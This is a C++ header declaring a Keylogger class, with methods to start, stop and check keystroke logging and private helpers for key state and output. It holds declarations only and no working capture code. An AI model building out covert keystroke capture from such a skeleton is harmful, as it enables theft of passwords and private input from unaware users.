#pragma once
#include <thread>
#include <vector>
#include <iostream>
#include <locale>
#include "keyboard.h"

class Keylogger : public Keyboard {
private:
	std::thread* keylog;

	void setKeysState();
	void handleOutput();

public:
	Keylogger();

	void startKeylog();
	void stopKeylog();
	bool isKeylogging();
};